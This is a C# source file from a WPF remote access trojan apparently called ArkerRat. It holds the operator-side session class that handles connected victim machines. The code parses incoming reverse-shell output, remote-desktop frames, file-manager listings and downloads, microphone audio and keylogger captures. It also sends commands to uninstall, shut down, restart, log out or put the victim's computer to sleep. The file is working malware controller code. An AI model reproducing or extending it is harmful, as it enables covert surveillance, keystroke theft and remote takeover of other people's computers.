using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.IO;
using System.Windows.Controls;
using System;
using System.Windows;
using System.Diagnostics;
using ArkerRatWpfVersion;
using System.Windows.Markup;
using System.Xml.Linq;
using System.Collections.Concurrent;
//using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace ArkerRatWpfVersion
{
    public class RATHostSession
    {
        public CancellationTokenSource source = new CancellationTokenSource();
        CancellationToken token;

        //This button is too know which client button belongs to which client.
        public DataItemClient dataItem = new DataItemClient
        {
            ClientName = "Unknown",
            OS = "Unknown",
            IPAddress = "Unknown",
            MS = "Unknown"
        };
        
        public int port = 0;
        public string tags { get; set; }
        public double ms = 0;
        public string[] clientInfo = new string[3];

        public TcpClient client { get; set; }
        public NetworkStream clientStream { get; set; }
        public RATHostSession(TcpClient tcpClient, string tag, int porte)
        {
            port = porte;
            client = tcpClient;
            clientStream = tcpClient.GetStream();
            token = source.Token;
            dataItem.Tag = tag;
            tags = tag;

            ReadData();
            Ping();
            
        }

        public async Task SendData(string textData)
        {
                try
                {
                    byte[] data = Encoding.UTF8.GetBytes(textData);
                    await clientStream.WriteAsync(data, 0, data.Length);
                    await clientStream.FlushAsync();
                }
            catch(Exception ex) { }
        }
        

        public string data = string.Empty;
        private async void ReadData()
        {
            StringBuilder stringBuilder = new StringBuilder();

            await Task.Run(async () =>
            {
                try
                {
                    while (!token.IsCancellationRequested)
                    {
                        byte[] buffer = new byte[GlobalVariables.byteSize];
                        int bytesRead = await clientStream.ReadAsync(buffer, 0, buffer.Length);
                        
                        if (bytesRead > 0)
                        {
                            string receivedData = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                            stringBuilder.Append(receivedData);

                            lock (GlobalVariables._lock)
                            {
                                data += stringBuilder.ToString();
                            }

                            await Task.Run(() => SortData("§ClientInfoStart§", "§ClientInfoEnd§"));
                            await Task.Run(() => SortData("§PingStart§", "§PingEnd§"));
                            await Task.Run(() => SortData("§RemoteDesktopStart§", "§RemoteDesktopEnd§"));
                            await Task.Run(() => SortData("§ReverseShellStart§", "§ReverseShellEnd§"));
                            await Task.Run(() => SortData("§FileManagerStart§", "§FileManagerEnd§"));
                            await Task.Run(() => SortData("§RemoteAudioStart§", "§RemoteAudioEnd§"));
                            await Task.Run(() => SortData("§KeyLoggerStart§", "§KeyLoggerEnd§"));


                            stringBuilder.Clear();
                        }

                        await Task.Delay(1);
                    }
                }
                catch (Exception ex) { }
            });
        }

        public string[] resulotion;
        private async void SortData(string startDelimiter, string endDelimiter)
        {
            do
            {
                lock (GlobalVariables._lock)
                {
                    int startIndex = data.IndexOf(startDelimiter) + startDelimiter.Length;
                    int endIndex = data.IndexOf(endDelimiter) - 1;

                   

                    if (startIndex != -1 && endIndex != -2 /*-2 because its always one less than the standard return -1 if you look at the squence abow*/&&startIndex<=endIndex+1)
                    {
                        string subString = string.Empty;

                        lock (GlobalVariables._lock)
                        {
                                subString = data.Substring(startIndex, endIndex - startIndex + 1);   
                            data = data.Replace(startDelimiter + subString + endDelimiter, string.Empty);
                        }

                        //if (subString?.Length != null || subString?.Length != 0)
                        if (startDelimiter == "§ReverseShellStart§")
                        {
                            reverseShellWindow.ReversShellFunction(subString);
                        }
                        else if (startDelimiter == "§RemoteDesktopStart§" && remoteDesktopWindowIsAlreadyOpen == true)
                        {                            
                                remoteDesktopWindow.frameQue.Enqueue(subString);   
                        }
                        else if (startDelimiter=="§RemoteAudioStart§")
                        {
                            if (subString.Contains("§ODS§"))
                            {
                                subString = subString.Replace("§ODS§", string.Empty);
                                Task.Run(()=> remoteAudioWindow.AddODevices(subString));
                            }
                            else if (subString.Contains("§IDS§"))
                            {
                                subString = subString.Replace("§IDS§", string.Empty);
                                Task.Run(() => remoteAudioWindow.AddIDevices(subString));
                            }
                            else
                            {
                                remoteAudioWindow?.EnqueAudioData(subString);
                            }
                        }
                        else if(startDelimiter == "§FileManagerStart§")
                        {
                            if (subString.Contains("§UF§"))
                            {
                                subString = subString.Replace("§UF§", string.Empty);

                                if (subString.Contains("§start§") && !fileManagerWindow.download)
                                {
                                    subString= subString.Replace("§start§", string.Empty);
                                    Task.Run(() => fileManagerWindow.StartDownloadingFile(subString));
                                }
                                else if (subString == "§end§")
                                {
                                    fileManagerWindow.download = false;
                                    fileManagerWindow.dataBuffer = new ConcurrentQueue<string>();
                                }
                                else
                                {
                                    fileManagerWindow.dataBuffer.Enqueue(subString);
                                }
                            }
                            else
                            {
                               Task.Run(()=>fileManagerWindow.GenerateFileSystem(subString));
                            }
                        }
                        else if(startDelimiter == "§KeyLoggerStart§")
                        {
                            if (subString.Contains("§OFK§"))
                            {
                                subString = subString.Replace("§OFK§", string.Empty);

                                if (subString == "start")
                                {
                                    Task.Run(() => keyLoggerWindow.StartDownloadingFile());
                                }
                                else if (subString == "end")
                                {
                                    keyLoggerWindow.download= false;
                                    keyLoggerWindow.dataBuffer = new ConcurrentQueue<string>();
                                }
                                else
                                {
                                    keyLoggerWindow.AddDataToBuffer(subString);
                                }
                            }
                            else
                            {
                                keyLoggerWindow.WriteKeyInputToTextBox(subString);
                            }
                            
                        }
                        else if (startDelimiter == "§PingStart§")
                        {
                            whenToStartPinging = "§Ping§";
                        }
                        else if (startDelimiter == "§ClientInfoStart§")
                        {
                            int startIndexx = subString.IndexOf("§ResulotionStart§") + 17;
                            int endIndexx = subString.IndexOf("§ResulotionEnd§")-1;
                            string info = subString.Substring(startIndexx, endIndexx - startIndexx + 1);
                            resulotion = info.Split(',');

                            string[] tempInfo = (subString.Replace("§ResulotionStart§" + info + "§ResulotionEnd§", string.Empty)).Split(',');

                            for (int i = 0; i < tempInfo.Length; i++)
                            {
                                clientInfo[i] = tempInfo[i];
                            }

                            Task.Run(async() => GlobalMethods.ShowNotification("Client connected", clientInfo[0]+" has connected at port:"+port));
                        }                      
                    }
                    else
                    {
                        break;
                    }
                }
              
            } while (true);
        }



        string whenToStartPinging = "";
        Stopwatch stopwatch;
        private async void Ping()
        {
            await Task.Run(async() =>
            {
                while (!token.IsCancellationRequested)
                {
                    if (whenToStartPinging == "")
                    {
                        stopwatch = Stopwatch.StartNew();
                        whenToStartPinging = "Wait for callback";
                        await SendData("§PingStart§§PingEnd§");
                    }
                    else if (whenToStartPinging == "§Ping§")
                    {
                        ms = stopwatch.ElapsedMilliseconds;
                        whenToStartPinging = "";
                        stopwatch.Stop();
                    }
                    else if(stopwatch.ElapsedMilliseconds > 10000)
                    {
                        stopwatch.Stop();
                        RemoveThisClientUI();
                        await GlobalMethods.ShowNotification("Client disconnected",clientInfo[0]+ " disconnected, timed out");
                        await SendData("§ReconnectStart§§ReconnectEnd§");
                    }
                    await Task.Delay(1);
                }

            });
        }
       
        public async void Disconnect(object sender, EventArgs e)
        {
            RemoveThisClientUI();
            await SendData("§DisconnectStart§§DisconnectEnd§");
        }


        public async void Uninstall(object sender, EventArgs e)
        {
            RemoveThisClientUI();
            await SendData("§UninstallStart§§UninstallEnd§");

        }

        public async void RemoveThisClientUI()
        {
           await Task.Run(() =>
            {

                ArkerRATServerMechanics.rATClients.Remove(this);
                source.Cancel();
                clientStream.Close();
                client.Close();



                CloseAllTheWindows();

            });
        }
        //______________________________________________________________
        //WINDOWS
        private void CloseAllTheWindows()
        {
            try
            {
                reverseShellWindow.Dispatcher.BeginInvoke(new Action(() =>
                {
                    reverseShellWindow.CloseWindow(null, null);
                }));
            }
            catch (Exception ex) { }

            try
            {
                remoteDesktopWindow.Dispatcher.BeginInvoke(new Action(() =>
                {
                    remoteDesktopWindow.CloseWindow(null, null);
                }));
            }
            catch (Exception ex) { }

            try
            {
                fileManagerWindow.Dispatcher.BeginInvoke(new Action(() =>
                {
                    fileManagerWindow.CloseWindow(null, null);
                }));
            }
            catch (Exception ex) { }

            try
            {
                remoteAudioWindow.Dispatcher.BeginInvoke(new Action(() =>
                {
                    remoteAudioWindow.CloseWindow(null, null);
                }));
            }
            catch (Exception ex) { }

            try
            {
                remoteAudioWindow.Dispatcher.BeginInvoke(new Action(() =>
                {
                    keyLoggerWindow.CloseWindow(null, null);
                }));
            }
            catch (Exception ex) { }
        }

        public ReverseShellWindow reverseShellWindow;
        public bool reverseShellWindowIsAlreadyOpen = false;
        public void StartReverseShell(object sender, EventArgs e)
        {   if(!reverseShellWindowIsAlreadyOpen)
            {
                reverseShellWindow = new ReverseShellWindow(this);
                reverseShellWindow.WindowState = WindowState.Normal;
                reverseShellWindow.Activate();
                reverseShellWindow.Show();
            }
        }

        public RemoteDesktopWindow remoteDesktopWindow;
        public bool remoteDesktopWindowIsAlreadyOpen = false;
        public void StartRemoteDesktop(object sender, EventArgs e)
        {
            if (!remoteDesktopWindowIsAlreadyOpen)
            {
                data = string.Empty;
                remoteDesktopWindow = new RemoteDesktopWindow(this);
                remoteDesktopWindow.WindowState = WindowState.Normal;
                remoteDesktopWindow.Activate();
                remoteDesktopWindow.Show();
            }
        }

        public File_Manager fileManagerWindow;
        public bool fileManagerWindowIsAlreadyOpen = false;
        public void StartFileManager(object sender, EventArgs e)
        {
            if (!fileManagerWindowIsAlreadyOpen)
            {
                fileManagerWindow = new File_Manager(this);
                fileManagerWindow.WindowState = WindowState.Normal;
                fileManagerWindow.Activate();
                fileManagerWindow.Show();
            }
        }

        public RemoteAudioWindow remoteAudioWindow;
        public bool remoteAudioWindowIsAlreadyOpen = false;
        public void StartRemoteAudio(object sender, EventArgs e)
        {
            if (!remoteAudioWindowIsAlreadyOpen)
            {
                remoteAudioWindow = new RemoteAudioWindow(this);
                remoteAudioWindow.WindowState = WindowState.Normal;
                remoteAudioWindow.Activate();
                remoteAudioWindow.Show();
            }
        }

        public KeyLoggerWindow keyLoggerWindow;
        public bool keyLoggerWindowIsAlreadyOpen = false;
        public void StartKeyLogger(object sender, EventArgs e)
        {
            if (!keyLoggerWindowIsAlreadyOpen)
            {
                keyLoggerWindow = new KeyLoggerWindow(this);
                keyLoggerWindow.WindowState = WindowState.Normal;
                keyLoggerWindow.Activate();
                keyLoggerWindow.Show();
            }
        }
        //____________________________________________________________

        public async void ShutDown(object sender, EventArgs e)
        {
            await SendData("§ShutDownStart§§ShutDownEnd§");

        }

        public async void Restart(object sender, EventArgs e)
        {
            await SendData("§RestartStart§§RestartEnd§");
        }

        public async void LogOut(object sender, EventArgs e)
        {
            await SendData("§LogOutStart§§LogOutEnd§");
        }

        public async void Sleep(object sender, EventArgs e)
        {
            await SendData("§SleepStart§§SleepEnd§");
        }
    }
}
